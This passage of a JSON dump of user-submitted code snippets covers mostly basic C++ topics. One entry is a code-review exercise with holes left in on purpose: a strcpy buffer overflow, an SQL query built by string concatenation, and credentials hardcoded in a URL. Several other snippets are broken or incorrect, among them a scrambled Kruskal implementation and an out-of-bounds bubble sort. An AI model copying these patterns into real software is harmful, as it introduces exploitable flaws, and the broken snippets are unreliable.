    "description": "// close an ifstream file by using the .close() method // EX) ifs.close();\n",
    "reg_date": "2021-10-12T11:39:10.000Z"
  },
  {
    "id": 1506,
    "keyword": null,
    "link": null,
    "title": " clrscr in cpp",
    "description": "#include<iostream.h> #include<conio.h>  void main() { int a=10, b=20; int sum=0; clrscr();  // use clrscr() after variable declaration sum=a+b; cout<<\"Sum: \"<<sum; getch(); }\n",
    "reg_date": "2021-10-12T11:39:10.000Z"
  },
  {
    "id": 1507,
    "keyword": null,
    "link": null,
    "title": " cmake define standard c++",
    "description": "set_property(TARGET [target] PROPERTY CXX_STANDARD [c++ version]) \n",
    "reg_date": "2021-10-12T11:39:11.000Z"
  },
  {
    "id": 1508,
    "keyword": null,
    "link": null,
    "title": " cmake g++ address sanitizer",
    "description": "set (CMAKE_CXX_FLAGS_DEBUG \"${CMAKE_CXX_FLAGS_DEBUG} -fno-omit-frame-pointer -fsanitize=address\") set (CMAKE_LINKER_FLAGS_DEBUG \"${CMAKE_LINKER_FLAGS_DEBUG} -fno-omit-frame-pointer -fsanitize=address\") \n",
    "reg_date": "2021-10-12T11:39:11.000Z"
  },
  {
    "id": 1509,
    "keyword": null,
    "link": null,
    "title": " cmd color text c++",
    "description": "#include <iostream> #include <windows.h>  int main() {     HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);     for(int k = 1; k < 255; k++) //higher k = more colour     {         SetConsoleTextAttribute(hConsole, k);         std::cout << k << std::endl;     } }\n",
    "reg_date": "2021-10-12T11:39:11.000Z"
  },
  {
    "id": 1510,
    "keyword": null,
    "link": null,
    "title": " code for bubble sort in c++",
    "description": "void bubbleSort (int S[ ],  int length) { \tbool isSorted = false; \twhile(!isSorted)    \t{ \t\tisSorted = true; \t\tfor(int i = 0; i<length; i++)       \t{ \t\t     if(S[i] > S[i+1])            \t     { \t\t\tint temp = S[i]; \t\t\tS[i] = S[i+1];      \t       \t\tS[i+1] = temp;             \t\tisSorted = false;            \t      }       \t}       \tlength--; } } \n#include <map> #include <set> #include <list> #include <cmath> #include <ctime> #include <deque> #include <queue> #include <stack> #include <string> #include <bitset> #include <cstdio> #include <limits> #include <vector> #include <climits> #include <cstring> #include <cstdlib> #include <fstream> #include <numeric> #include <sstream> #include <iostream> #include <algorithm> #include <unordered_map>  using namespace std;   int main(){     int n,temp,c=0;     cin >> n;    int a[n];     for(int i=0;i<n;i++)         {         cin>>a[i];     }     for(int i=0;i<n-1;i++)     {         for(int j=0;j<n-i-1;j++)             {             if(a[j]>a[j+1])                 {                 temp=a[j];                 a[j]=a[j+1];                 a[j+1]=temp;                 c++;             }         }          if(c==0)         {         break;     }}     cout<<\"Array is sorted in \"<<c<<\" swaps.\"<<endl;     cout<<\"First Element:\"<<\" \"<<a[0]<<endl;     cout<<\"Last Element:\"<<\" \"<<a[n-1]<<endl;     return 0; }\ncout<<\"\\n Hello World \";\n",
    "reg_date": "2021-10-12T11:39:11.000Z"
  },
  {
    "id": 1511,
    "keyword": null,
    "link": null,
    "title": " code implementation of krushkals algorithm",
    "description": "a,b,u,v,n,ne=1;     int min,mincost=0,cost[9][9],parent[9];     int find(int);     int uni(int,int);     void main()     {    #include <stdio.h>     #include <conio.h>     #include <stdlib.h>     int i,j,k,     \tprintf(\"\\n\\tImplementation of Kruskal's Algorithm\\n\");     \tprintf(\"\\nEnter the no. of vertices:\");     \tscanf(\"%d\",&n);     \tprintf(\"\\nEnter the cost adjacency matrix:\\n\");     \tfor(i=1;i<=n;i++)     \t{     \tfor(j=1;j<=n;j++)     \t{     \tscanf(\"%d\",&cost[i][j]);     \tif(cost[i][j]==0)     \tcost[i][j]=999;     \t}     \t}     \tprintf(\"The edges of Minimum Cost Spanning Tree are\\n\");     \twhile(ne < n)     \t{     \tfor(i=1,min=999;i<=n;i++)     \t{     \tfor(j=1;j <= n;j++)     \t{     \tif(cost[i][j] < min)     \t{     \tmin=cost[i][j];     \ta=u=i;     \tb=v=j;     \t}     \t}     \t}     \tu=find(u);     \tv=find(v);     \tif(uni(u,v))     \t{     \tprintf(\"%d edge (%d,%d) =%d\\n\",ne++,a,b,min);     \tmincost +=min;     \t}     \tcost[a][b]=cost[b][a]=999;     \t}     \tprintf(\"\\n\\tMinimum cost = %d\\n\",mincost);     \tgetch();     }     int find(int i)     {     \twhile(parent[i])     \ti=parent[i];     \treturn i;     }     int uni(int i,int j)     {     \tif(i!=j)     \t{     \tparent[j]=i;     \treturn 1;     \t}     \treturn 0;     } \n",
    "reg_date": "2021-10-12T11:39:11.000Z"
  },
  {
    "id": 1512,
    "keyword": null,
    "link": null,
    "title": " code to find the last digit of a number",
    "description": "int n; cout<<\"Enter the number\"; cin>>n; int LD= n % 10; cout<<LD<<endl;\n//C++ int last_digit = number % 10;\n",
    "reg_date": "2021-10-12T11:39:12.000Z"
  },
  {
    "id": 1513,
    "keyword": null,
    "link": null,
    "title": " codeforces 102397e solution",
    "description": "#include<bits/stdc++.h> using namespace std; typedef long long ll; const int maxn=1000005; int n,x,ans=maxn; ll a[maxn],sum[maxn]; int main(){ \tscanf(\"%d%d\",&n,&x); \tfor(int i=1;i<=n;i++){ \t\tscanf(\"%d\",&a[i]); \t\tsum[i]=sum[i-1]+a[i]; \t} \tif(sum[n]<x) return cout<<-1,0; \tint l=0,temp=maxn; //\tfor(int i=1;i<=n;i++) cout<<sum[i]<<\" \"; //\tcout<<endl; \tfor(int r=1;r<=n;r++){ \t\tif(sum[r]-sum[l]>=x){ \t\t\twhile(l<r){ \t\t\t\tif(sum[r]-sum[l+1]>=x) l++; \t\t\t\telse break;  \t\t\t} \t\t\tif(r==1+l) return cout<<1,0; \t\t\ttemp=r-l; \t\t\tans=min(ans,temp); //\t\t\tcout<<l<<\" \"<<r<<\" \"<<temp<<\" \"<<ans<<endl; \t\t} \t} \tprintf(\"%d\",ans); \treturn 0; }  12345678910111213141516171819202122232425262728293031\n",
    "reg_date": "2021-10-12T11:39:12.000Z"
  },
  {
    "id": 1514,
    "keyword": null,
    "link": null,
    "title": " coding languages for zoom",
    "description": "cout>>\"Awesom\"\n",
    "reg_date": "2021-10-12T11:39:12.000Z"
  },
  {
    "id": 1515,
    "keyword": null,
    "link": null,
    "title": " coinPiles",
    "description": "#include<bits/stdc++.h> using namespace std;  #define int int64_t #define pb push_back #define f(a,b)  for(int i=a; i<b; i++)  signed main(){       int t; cin>>t;       int a, b;       while(t--)       {             cin>>a>>b;             while(true)             {                   a>b ? a-=2, b-- : b -= 2,a--;                   if(a==0 || b==0) break;             }             if(a==0 && b==0) { cout<<\"YES\\n\"; continue; }             if(a==0 && b!=0) { cout<<\"NO\\n\"; continue; }             if(a!=0 || b==0) { cout<<\"NO\\n\"; continue; }       }       return 0; }\n",
    "reg_date": "2021-10-12T11:39:12.000Z"
  },
  {
    "id": 1516,
    "keyword": null,
    "link": null,
    "title": " collections c# vs c++",
    "description": "Array - C array, though the .NET Array can have a non-zero starting index. List<T> - std::vector<T> Dictionary<TKey, TValue> - unordered_map<Key, Data> HashSet<T> - unordered_set<Key> SortedDictionary<TKey, TValue> - std::map<Key, Data> SortedList<TKey, TValue> - equivalent to a std::vector<T> but keeping it ordered by using binary search + insert when adding elements. SortedSet<T> - std::set<Key> Queue<T> - std::queue<T> Stack<T> - std::stack<T> LinkedList<T> - std::list<T>\n",
    "reg_date": "2021-10-12T11:39:12.000Z"
  },
  {
    "id": 1517,
    "keyword": null,
    "link": null,
    "title": " columntransformer onehotencoder",
    "description": "from sklearn.compose import ColumnTransformer from sklearn.preprocessing import OneHotEncoder\n",
    "reg_date": "2021-10-12T11:39:13.000Z"
  },
  {
    "id": 1518,
    "keyword": null,
    "link": null,
    "title": " com fazer a raiz quadrada em c++",
    "description": "#include <stdlib.h> #include <stdio.h> #include <math.h>  /* square root of a number */  int main(){ float num, raiz; printf(\"enter a number: \\t\"); scanf(\"%f\",&num); raiz = sqrt(num); printf(\"The square root of %f is: %f.\\n\", num, raiz); system(\"pause\"); return 0;     }\n",
    "reg_date": "2021-10-12T11:39:13.000Z"
  },
  {
    "id": 1519,
    "keyword": null,
    "link": null,
    "title": " combination sum iv leetcode",
    "description": "public int combinationSum4(int[] nums, int target) {     if (target == 0) {         return 1;     }     int res = 0;     for (int i = 0; i < nums.length; i++) {         if (target >= nums[i]) {             res += combinationSum4(nums, target - nums[i]);         }     }     return res; } \n",
    "reg_date": "2021-10-12T11:39:13.000Z"
  },
  {
    "id": 1520,
    "keyword": null,
    "link": null,
    "title": " combine two vectors c++",
    "description": "vector1.insert(vector1.end(), vector2.begin(), vector2.end());\nvector<int> v1 = {1, 2, 3};  vector<int> v2 = {4, 5, 6}; copy(v1.begin(), v1.end(),back_inserter(v2));  // v2 now contains 4 5 6 1 2 3 \nstd::vector<int> AB = A; AB.insert(AB.end(), B.begin(), B.end());\n",
    "reg_date": "2021-10-12T11:39:13.000Z"
  },
  {
    "id": 1521,
    "keyword": null,
    "link": null,
    "title": " come allocare dinamicamente una matrice c++",
    "description": "#include <iostream> using namespace std;  int main() { int hh; int x; //usiamo solo x poiche la matrice &egrave; quadrata int dim_riga, dim_colonna; int **MATRICE; // inizializazione del puntatatore (doppio star poich&egrave; &egrave; un array bidimensionale)   cout << \"Definire la dimensione della matrice \"; cin >> x; cout << endl;   // Allocazione dinamica della matrice  MATRICE = new int*[x]; //alloca lo spazio per x puntatori  for(dim_riga=0; dim_riga<x; dim_riga++) //per ogni riga MATRICE[dim_riga] = new int[x];        //assegna ai puntatori delle righe della matrice l'indirizzo di x   // Riempimento matrice for (dim_riga = 0; dim_riga < x; dim_riga++)     {         for (dim_colonna = 0; dim_colonna < x; dim_colonna++)         {             cout <<\"inserisci il valore da asseganre alla riga: \" <<dim_riga <<\" e alla colonna: \" <<dim_colonna <<\" --> \";             cin >> MATRICE [dim_riga] [dim_colonna];         }     } cout << endl;  //lettura cout<<\"la tua matrice e': \" <<endl;     for (dim_riga = 0; dim_riga < x; dim_riga++)         {              for (dim_colonna = 0; dim_colonna < x; dim_colonna++)             {                 cout <<\" \" <<MATRICE[dim_riga][dim_colonna];             }             cout <<endl;         }   cout <<\"inserire la colonna da eliminare: \"; cin >>hh; for (int i=0; i<x; i++){ delete MATRICE [i][hh]; }   //lettura cout<<\"la tua matrice e': \" <<endl;     for (dim_riga = 0; dim_riga < x; dim_riga++)         {              for (dim_colonna = 0; dim_colonna < x; dim_colonna++)             {                 cout <<\" \" <<MATRICE[dim_riga][dim_colonna];             }             cout <<endl;         }   return 0; }\n",
    "reg_date": "2021-10-12T11:39:13.000Z"
  },
  {
    "id": 1522,
    "keyword": null,
    "link": null,
    "title": " comentar todas linhas de uma vez vs code",
    "description": "cntrl + k + c // Comenta todas as linha do c&oacute;digo\n",
    "reg_date": "2021-10-12T11:39:13.000Z"
  },
  {
    "id": 1523,
    "keyword": null,
    "link": null,
    "title": " command line options in c++",
    "description": "// Use command lines  int main(int argc, char *argv[]) {  \tfor(int i = 1; i < argc; i++){ \t\tif(!strcmp(argv[i], \"-h\") || !strcmp(argv[i], \"--help\") ){ \t\t\tprintf(\"Usage: App <options>\\nOptions are:\\n\"); \t\t\tprintf(\"Option list goes here\"); \t\t\texit(0); \t\t}else if(!strcmp(argv[i], \"-c\") || !strcmp(argv[i], \"--custom\")){ \t\t\tprintf(\"argument accepted\"); \t\t}else{ \t\t\tif(i == argc-1){ \t\t\t\tbreak; \t\t\t} \t\t\tMessageBox(NULL, TEXT(\"ERROR: Invalid Command Line Option Found: \\\"%s\\\".\\n\", argv[i]), TEXT(\"Error\"), MB_ICONERROR | MB_OK); \t\t} \t}  \tMessageBox(NULL, TEXT(\"ERROR: No Command Line Option Found. Type in --hep or -h\"), TEXT(\"Error\"), MB_ICONERROR | MB_OK); }\n",
    "reg_date": "2021-10-12T11:39:13.000Z"
  },
  {
    "id": 1524,
    "keyword": null,
    "link": null,
    "title": " comment générer un nombre aléatoire C++",
    "description": "#include <stdlib.h> #include <stdio.h> #include <time.h>  int Rand( int a, int b) {        int nRand ;        nRand= a + (int)((float)rand() * (b-a+1) / (RAND_MAX-1)) ;        return nRand; }  int main() {        int i;        srand((unsigned)time(0));        for (i=0; i<10; i++)        {                printf(\"nRand[%d]=%d\\n\",i,Rand(-100,100));        }        return 0; }\n",
    "reg_date": "2021-10-12T11:39:13.000Z"
  },
  {
    "id": 1525,
    "keyword": null,
    "link": null,
    "title": " comment in c++",
    "description": "/* This is a comment */  /* C++ comments can also    * span multiple lines */  /* Meowwwwww */\n// This is a single one line comment  /* multiline comment */\n// 1.This is a single line comment  /* 2. This is a \tmulti-line comment */ \n// This is a Comment /* This is a Comment *\\\n",
    "reg_date": "2021-10-12T11:39:13.000Z"
  },
  {
    "id": 1526,
    "keyword": null,
    "link": null,
    "title": " comment installer boost c++ sur windows",
    "description": "goto \" https://www.boost.org/users/download/ \" goto \"Prebuilt windows binaries\" clickez sur la version que vous voulez t&eacute;l&eacute;chargez le dernier .exe sortie installer le\n",
    "reg_date": "2021-10-12T11:39:14.000Z"
  },
  {
    "id": 1527,
    "keyword": null,
    "link": null,
    "title": " comment multiple lines matlab",
    "description": "%{ Commented code here. %}\n% Example %{ sum(a) diag(a) sum(diag(a)) %}\n",
    "reg_date": "2021-10-12T11:39:14.000Z"
  },
  {
    "id": 1528,
    "keyword": null,
    "link": null,
    "title": " como medir tiempo de ejecucion cpp",
    "description": "#include <iostream> #include <ctime>    unsigned t0, t1;   t0=clock() // Code to execute t1 = clock();   double time = (double(t1-t0)/CLOCKS_PER_SEC); cout << \"Execution Time: \" << time << endl; \n",
    "reg_date": "2021-10-12T11:39:14.000Z"
  },
  {
    "id": 1529,
    "keyword": null,
    "link": null,
    "title": " comparator for priority queue c++",
    "description": "class Foo {  };  class Compare { public:     bool operator() (Foo, Foo)     {         return true;     } };  int main() {     std::priority_queue<Foo, std::vector<Foo>, Compare> pq;     return 0; } \n",
    "reg_date": "2021-10-12T11:39:14.000Z"
  },
  {
    "id": 1530,
    "keyword": null,
    "link": null,
    "title": " comparator pair cpp",
    "description": " // Driver function to sort the vector elements // by second element of pairs bool sortbysec(const pair<int,int> &a,               const pair<int,int> &b) {     return (a.second < b.second); } \n",
    "reg_date": "2021-10-12T11:39:14.000Z"
  },
  {
    "id": 1531,
    "keyword": null,
    "link": null,
    "title": " compare string c++",
    "description": "// comparing apples with apples #include <iostream> #include <string>  int main () {   std::string str1 (\"green apple\");   std::string str2 (\"red apple\");    if (str1.compare(str2) != 0)     std::cout << str1 << \" is not \" << str2 << '\\n';    if (str1.compare(6,5,\"apple\") == 0)     std::cout << \"still, \" << str1 << \" is an apple\\n\";    if (str2.compare(str2.size()-5,5,\"apple\") == 0)     std::cout << \"and \" << str2 << \" is also an apple\\n\";    if (str1.compare(6,5,str2,4,5) == 0)     std::cout << \"therefore, both are apples\\n\";    return 0; }\nint compare (const string& str) const; \n",
    "reg_date": "2021-10-12T11:39:14.000Z"
  },
  {
    "id": 1532,
    "keyword": null,
    "link": null,
    "title": " compare substring with char c++",
    "description": "// comparing apples with apples #include <iostream> #include <string>  int main () {   std::string str1 (\"green apple\");   std::string str2 (\"red apple\");    if (str1.compare(str2) != 0)     std::cout << str1 << \" is not \" << str2 << '\\n';    if (str1.compare(6,5,\"apple\") == 0)     std::cout << \"still, \" << str1 << \" is an apple\\n\";    if (str2.compare(str2.size()-5,5,\"apple\") == 0)     std::cout << \"and \" << str2 << \" is also an apple\\n\";    if (str1.compare(6,5,str2,4,5) == 0)     std::cout << \"therefore, both are apples\\n\";    return 0; }\nhello world\nint compare (const string& str) const; \n",
    "reg_date": "2021-10-12T11:39:14.000Z"
  },
  {
    "id": 1533,
    "keyword": null,
    "link": null,
    "title": " compare two functions in a class c++",
    "description": "class Date { public: Date();                                  // Constructor without parameters Date(int m, int d, int y); // Constructor with parameters.  // accessors int GetMonth();               // returns the size of the diamond int GetDay(); int GetYear();  // mutators bool Set(int m, int d, int y); bool SetFormat(char f);  // standard input and output routines void Input();              void Show();               void Increment(int numDays = 1);                  int Compare(const Date& d);       private: int month,                    // month variables     day,                 // day variable     year;               // year variable char format; }; \n",
    "reg_date": "2021-10-12T11:39:14.000Z"
  },
  {
    "id": 1534,
    "keyword": null,
    "link": null,
    "title": " compare values within within a vector c++",
    "description": "for (unsigned int i = 1; i < myVector.size(); i++)  {     if (myVector[i].size() == myVector[i-1].size()) // .size() should be used     {         cout << \"SAME SIZE\" << endl;     } }\n",
    "reg_date": "2021-10-12T11:39:14.000Z"
  },
  {
    "id": 1535,
    "keyword": null,
    "link": null,
    "title": " compile c++ in cmd windows",
    "description": " - To compile :  gcc sourcefile_name.c -o outputfile.exe  - To run : outputfile.exe\n            /* Run C++ in cmd */ 1. Download, install the compilerand and edit Environment Variables.    2. Type the C/C++ program and save it.    3. Open the command line and change directory to the particular one where  the source file is stored  4. To compile, type in the command prompt: //an exe file will be generated         gcc sourcefile_name.c -o outputfile.exe Ex: gcc HelloWorld.c -o HelloWorld.exe    5. To run the code, type:         outputfile.exe Ex: HelloWorld.exe\n",
    "reg_date": "2021-10-12T11:39:14.000Z"
  },
  {
    "id": 1536,
    "keyword": null,
    "link": null,
    "title": " compile c++ linux",
    "description": "g++ foo.cpp -o foo //plus other extension like the opencv to compile correctly\ng++ program.cpp make program ./program\n",
    "reg_date": "2021-10-12T11:39:15.000Z"
  },
  {
    "id": 1537,
    "keyword": null,
    "link": null,
    "title": " compile c++ program",
    "description": "$ g++ -o <name-you-want-to-give> source.cpp $ ./myprogram\n#include <stdio.h> #include <stdlib.h> #include <string> #include <iostream>  /* Premise:  We have a top secret file that only authorized users are allowed to download, and they need a CLI tool for retrieving it. We tasked a developer with building the server and client for this. He built the client first, and has sent you his code for review.  What feedback, questions, or concerns would you give the developer after reviewing his client.  */ bool userIsFound(std::string query) {   // Pretend this method actually executes an SQL query instead of always returning true   return true; }  void fetchHttpFile(std::string url) {   // Pretend the code for this lives somewhere else }  int main (int argc, char* argv[]) {   char username[20];   char password[20];   strcpy(username, argv[1]);   strcpy(password, argv[2]);    std::string query = \"SELECT * FROM users WHERE username=\" + std::string(username) + \" AND password=\" + std::string(password);   std::string url = \"http://secretuser:secretpassword@www.example.com/secretfile\";    if (userIsFound(query)) {     fetchHttpFile(url);     std::cout << \"Downloading file: \" + url;     exit (EXIT_SUCCESS);   }   else   {     std::cout << \"Error downloading file: \" + url + \" You do not have permission.\";     exit (EXIT_FAILURE);   } }\n",
    "reg_date": "2021-10-12T11:39:15.000Z"
  },
  {
    "id": 1538,
    "keyword": null,
    "link": null,
    "title": " compile in c++",
    "description": "$ g++ -o <name-you-want-to-give> source.cpp\n",
    "reg_date": "2021-10-12T11:39:15.000Z"
  },
  {
    "id": 1539,
    "keyword": null,
    "link": null,
    "title": " compile multiple files C++ linux",
    "description": "g++ *.cpp -o output\n",
    "reg_date": "2021-10-12T11:39:15.000Z"
  },
  {
    "id": 1540,
    "keyword": null,
    "link": null,
    "title": " compile notepad++ c++",
    "description": "npp_save cd \"$(CURRENT_DIRECTORY)\" g++ \"$(FILE_NAME)\" -o $(NAME_PART) -march=native -O3 NPP_RUN $(NAME_PART) \n",
    "reg_date": "2021-10-12T11:39:15.000Z"
  },
  {
    "id": 1541,
    "keyword": null,
    "link": null,
    "title": " composition namespaces c++",
    "description": "namespace foo {     int var = 0;     // more declarations }  namespace bar {     int var = 1;     // more declarations }  namespace baz {     // composition of namespaces foo and bar     using namespace foo;     using namespace bar;  }\n",
    "reg_date": "2021-10-12T11:39:15.000Z"
  },
  {
    "id": 1542,
    "keyword": null,
    "link": null,
    "title": " concat string in c++",
    "description": "// with C++11 string result = name + std::to_string(age);\n#include <iostream> #include <cstdlib>  std::string text = \"hello\"; std::string moretext = \"there\"; std::string together = text + moretext; std::cout << together << std::endl;  >> hello there\n#include <iostream> #include <sstream>  int main() {   std::string value = \"Hello, \" + \"world!\";   std::cout << value << std::endl;    //Or you can use ostringstream and use integers too   //For example:    std::ostringstream ss;   ss << \"This is an integer\" << 104;   std::cout << ss.str() << std::endl; }\nstring first_name = \"foo\" string last_name = \"bar\" std::cout << first_name + \" \" + last_name << std::endl;\nint x=5; int y= 10;  int z = x+y;//z==15  string s1=\"Abhi\"; string s2=\"gautam\";  string s3= s1+s3;//s3==Abhigautam \n#include<iostream> #include <string> int main() { \t//\"Ever thing inside these double quotes becomes const char array\" //\tstd::string namee = \"Caleb\" +\"Hello\";//This will give error because adding const char array to const char array  \tstd::string namee = \"Caleb\"; \tnamee += \" Hello\";//This will work because adding a ptr to a actual string \tstd::cout << namee << std::endl;// output=>Caleb Hello //You can also use the below \tstd::string namee2 = std::string(\"Caleb\")+\" Hello\";// This will work because constructor will convert const char array  to string, adding a ptr to string \tstd::cout << namee2 << std::endl;// output=>Caleb Hello \tstd::cin.get(); }\n",
    "reg_date": "2021-10-12T11:39:15.000Z"
  },
  {
    "id": 1543,
    "keyword": null,
    "link": null,
    "title": " concatenate two strings in c++",
    "description": "#include <iostream> using namespace std;  int main() {     string s1, s2, result;      cout << \"Enter string s1: \";     getline (cin, s1);      cout << \"Enter string s2: \";     getline (cin, s2);      result = s1 + s2;      cout << \"Resultant String = \"<< result;      return 0; } \n",
    "reg_date": "2021-10-12T11:39:15.000Z"
  },
  {
    "id": 1544,
    "keyword": null,
    "link": null,
    "title": " concatenate two vectors c++",
    "description": "#include <vector> // vector  #include <iostream> // output  using namespace std;  int main() {   // two vectors to concatenate   vector<int> A = {1,3,5,7};   vector<int> B = {2,4,6,8};   // vector that will hold the combined values of A and B   std::vector<int> AB = A;   AB.insert(AB.end(), B.begin(), B.end());   // output    for (auto i : AB) {       cout << i << ' ';   } }\n",
    "reg_date": "2021-10-12T11:39:16.000Z"
  },
  {
    "id": 1545,
    "keyword": null,
    "link": null,
    "title": " concatenation cpp int and stirng",
    "description": "// with C++11 string result = name + std::to_string(age);\n",
    "reg_date": "2021-10-12T11:39:16.000Z"
  },
  {
    "id": 1546,
    "keyword": null,
    "link": null,
    "title": " conda list envs",
    "description": "conda info --envs  conda env list\nconda create --clone py35 --name py35-2\n# using pip pip install -r requirements.txt  # using Conda conda create --name <env_name> --file requirements.txt\nconda create -n myenv python=3.6 \nconda env list\nconda create --name myenv \n",
    "reg_date": "2021-10-12T11:39:16.000Z"
  },
  {
    "id": 1547,
    "keyword": null,
    "link": null,
    "title": " condition variable wait unlocks mutex c++",
    "description": "std::mutex mutex; std::queue buffer;               std::condition_variable buffer_cond;  void data_preparation_thread() {     while(has_data_to_prepare())                //--  (1)         {       buffer_data data = prepare_data();       std::lock_quard lock(mutex);  //--  (2)        buffer.push(data);                               buffer_cond.notify_one();                 //-- (3)       } }  void data_processing_thread() {     while(true)     {       std::unique_lock lock(mutex);              //-- (4)         buffer_cond.wait(lock, []{return ! buffer.empty()})    //-- (5)          buffer_data data = buffer.front();       buffer.pop();       lock.unlock();                                         //-- (6)          process(data);       if(is_last_data_entry(data))            break;              }   } \n",
    "reg_date": "2021-10-12T11:39:16.000Z"
  },
  {
    "id": 1548,
    "keyword": null,
    "link": null,
    "title": " conditional cout in c++",
    "description": "int cheese = 0;  // Example of a simple ternary with output stream operators. std::cout << (cheese ? \"We have cheese.\" : \"+++Out of Cheese Error+++\") << std::endl;  \n",
    "reg_date": "2021-10-12T11:39:16.000Z"
  },
  {
    "id": 1549,
    "keyword": null,
    "link": null,
    "title": " conditional operator in c++",
    "description": "(condition) ? (if_true) : (if_false)\n//(expression 1) ? expression 2 : expression 3 //If expression 1 evaluates to true, then expression 2 is evaluated.    int x, y = 10;     x = (y < 10) ? 30 : 40;    cout << \"value of x: \" << x << endl; //prints 40      \n // syntax condition ? inline code for ture condition : inline code for false condition;  3 > 2 ? true : false; // return true\n",
    "reg_date": "2021-10-12T11:39:16.000Z"
  },
  {
    "id": 1550,
    "keyword": null,
    "link": null,
    "title": " conditional operator in cpp",
    "description": "<condition> ? <true-case-code> : <false-case-code>; \n//(expression 1) ? expression 2 : expression 3 //If expression 1 evaluates to true, then expression 2 is evaluated.    int x, y = 10;     x = (y < 10) ? 30 : 40;    cout << \"value of x: \" << x << endl; //prints 40      \n",
    "reg_date": "2021-10-12T11:39:16.000Z"
  },
  {
    "id": 1551,
    "keyword": null,
    "link": null,
    "title": " conditional variables code in c++",
    "description": "// condition_variable example #include <iostream>           // std::cout #include <thread>             // std::thread #include <mutex>              // std::mutex, std::unique_lock #include <condition_variable> // std::condition_variable  std::mutex mtx; std::condition_variable cv; bool ready = false;  void print_id (int id) {   std::unique_lock<std::mutex> lck(mtx);   while (!ready) cv.wait(lck);   // ...   std::cout << \"thread \" << id << '\\n'; }  void go() {   std::unique_lock<std::mutex> lck(mtx);   ready = true;   cv.notify_all(); }  int main () {   std::thread threads[10];   // spawn 10 threads:   for (int i=0; i<10; ++i)     threads[i] = std::thread(print_id,i);    std::cout << \"10 threads ready to race...\\n\";   go();                       // go!    for (auto& th : threads) th.join();    return 0; }\n",
    "reg_date": "2021-10-12T11:39:16.000Z"
  },
  {
    "id": 1552,
    "keyword": null,
    "link": null,
    "title": " configure autotools cpp",
    "description": " #                                               -*- Autoconf -*-                                                                                                                     # Process this file with autoconf to produce a configure script.                                                                                                                                                                                                                                                                                          AC_PREREQ([2.68])                                                                                                                                                                    AC_INIT([mainfix], [0.00.00], [j.bokma@rug.nl])                                                                                                                                      AM_INIT_AUTOMAKE([1.10 -Wall no-define foreign])                                                                                                                                     AC_CONFIG_SRCDIR([src/main.cc])                                                                                                                                                      AC_CONFIG_HEADERS([config.h])  # Checks for programs. AC_PROG_CXX AC_PROG_CC  # Checks for libraries.  # Checks for header files.  # Checks for typedefs, structures, and compiler characteristics. AC_HEADER_STDBOOL AC_C_INLINE AC_TYPE_SIZE_T  # Checks for library functions.  AC_CONFIG_FILES([Makefile]) AC_OUTPUT \t  \n",
    "reg_date": "2021-10-12T11:39:16.000Z"
  },
  {
    "id": 1553,
    "keyword": null,
    "link": null,
    "title": " console clear c+",
    "description": "#include <Windows.h>  int main() { \t//print stuff      \tsystem(\"cls\"); // clear console }\nsystem (\"CLS\");\ni swear if you write system(\"cls\"); one more time you're ugly\n",
    "reg_date": "2021-10-12T11:39:16.000Z"
  },
  {
    "id": 1554,
    "keyword": null,
    "link": null,
    "title": " console colors in C++",
    "description": "//This is a header file taken from cplusplus.com //http://www.cplusplus.com/articles/Eyhv0pDG/ //concol.h #ifndef _INC_EKU_IO_CONCOL #define _INC_EKU_IO_CONCOL  /*Header file to color text and background in windows console applications Global variables - textcol,backcol,deftextcol,defbackcol,colorprotect*/  #include<windows.h> #include<iosfwd>  namespace eku {  #ifndef CONCOL #define CONCOL \tenum concol \t{ \t\tblack=0, \t\tdark_blue=1, \t\tdark_green=2, \t\tdark_aqua,dark_cyan=3, \t\tdark_red=4, \t\tdark_purple=5,dark_pink=5,dark_magenta=5, \t\tdark_yellow=6, \t\tdark_white=7, \t\tgray=8, \t\tblue=9, \t\tgreen=10, \t\taqua=11,cyan=11, \t\tred=12, \t\tpurple=13,pink=13,magenta=13, \t\tyellow=14, \t\twhite=15 \t}; #endif //CONCOL  \tHANDLE std_con_out; \t//Standard Output Handle \tbool colorprotect=false; \t//If colorprotect is true, background and text colors will never be the same \tconcol textcol,backcol,deftextcol,defbackcol; \t/*textcol - current text color \tbackcol - current back color \tdeftextcol - original text color \tdefbackcol - original back color*/  \tinline void update_colors() \t{ \t\tCONSOLE_SCREEN_BUFFER_INFO csbi; \t\tGetConsoleScreenBufferInfo(std_con_out,&csbi); \t\ttextcol = concol(csbi.wAttributes & 15); \t\tbackcol = concol((csbi.wAttributes & 0xf0)>>4); \t}  \tinline void setcolor(concol textcolor,concol backcolor) \t{ \t\tif(colorprotect && textcolor==backcolor)return; \t\ttextcol=textcolor;backcol=backcolor; \t\tunsigned short wAttributes=((unsigned int)backcol<<4) | (unsigned int)textcol; \t\tSetConsoleTextAttribute(std_con_out,wAttributes); \t}  \tinline void settextcolor(concol textcolor) \t{ \t\tif(colorprotect && textcolor==backcol)return; \t\ttextcol=textcolor; \t\tunsigned short wAttributes=((unsigned int)backcol<<4) | (unsigned int)textcol; \t\tSetConsoleTextAttribute(std_con_out,wAttributes); \t}  \tinline void setbackcolor(concol backcolor) \t{ \t\tif(colorprotect && textcol==backcolor)return; \t\tbackcol=backcolor; \t\tunsigned short wAttributes=((unsigned int)backcol<<4) | (unsigned int)textcol; \t\tSetConsoleTextAttribute(std_con_out,wAttributes); \t}  \tinline void concolinit() \t{ \t\tstd_con_out=GetStdHandle(STD_OUTPUT_HANDLE); \t\tupdate_colors(); \t\tdeftextcol=textcol;defbackcol=backcol; \t}  \ttemplate<class elem,class traits> \tinline std::basic_ostream<elem,traits>& operator<<(std::basic_ostream<elem,traits>& os,concol col) \t{os.flush();settextcolor(col);return os;}  \ttemplate<class elem,class traits> \tinline std::basic_istream<elem,traits>& operator>>(std::basic_istream<elem,traits>& is,concol col) \t{ \t\tstd::basic_ostream<elem,traits>* p=is.tie(); \t\tif(p!=NULL)p->flush(); \t\tsettextcolor(col); \t\treturn is; \t} \t }\t//end of namespace eku  #endif\t//_INC_EKU_IO_CONCOL\n//This is one way to do it. Taken from stackoverflow. system(\"color 70\"); //It just runs a cmd command.\n",
    "reg_date": "2021-10-12T11:39:17.000Z"
  },
  {
    "id": 1555,
    "keyword": null,
    "link": null,
    "title": " const c++",
